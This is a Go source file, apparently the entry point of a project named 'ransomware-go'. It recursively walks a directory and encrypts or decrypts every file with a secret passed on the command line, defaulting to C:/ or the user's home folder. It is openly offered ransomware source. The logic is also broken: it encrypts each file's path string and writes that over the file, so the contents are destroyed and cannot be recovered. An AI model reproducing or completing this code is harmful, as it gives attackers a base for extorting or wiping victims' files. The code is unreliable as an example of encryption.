package main

import (
	"fmt"
	"os"
	"flag"
	"sync"
	"runtime"
	"strings"
	"io/ioutil"
	"path/filepath"

	"ransomware-go/crypt"
)

var (
	wg            sync.WaitGroup
	decrypt       bool
	secret        string
	target        string
	directoryBase string
)

func init() {
	flag.BoolVar(&decrypt, "decrypt", false, "--decrypt")
	flag.StringVar(&secret, "secret", "", "--secret=your_secret")
	flag.StringVar(&target, "target", "", "--target=your_path_target")
	flag.Parse()

	if len(target) == 0 {
		if runtime.GOOS == "windows" {
			directoryBase = "C:/"
		} else {
			directoryBase = "/home/" + os.Getenv("USER")
		}
	}
}

func fileCrypt(filePath string) {
	defer wg.Done()

	var newFileName string

	if decrypt {
		newFileName = crypt.Decrypt([]byte(filePath), secret)
	} else {
		newFileName = crypt.Encrypt([]byte(filePath), secret)
	}

	ioutil.WriteFile(filePath, []byte(newFileName), 0644)
}

func start(path string) {
	defer wg.Done()

	pathInfo, err := os.Stat(path)

	if err != nil {
		fmt.Println(err)
		return
	}

	switch mode := pathInfo.Mode(); {
	case mode.IsDir():
		filepath.Walk(path, func(relativePath string, info os.FileInfo, err error) error {
			if strings.Compare(path, relativePath) != 0 {
				wg.Add(1)
				go fileCrypt(relativePath)
			}
			return nil
		})
	case mode.IsRegular():
		wg.Add(1)
		go fileCrypt(path)
	}
}

func main() {

	if len(secret) == 0 {
		panic("Invalid secret, try: --secret=your_secret")
	}

	wg.Add(1)
	go start("./test")
	wg.Wait()
}
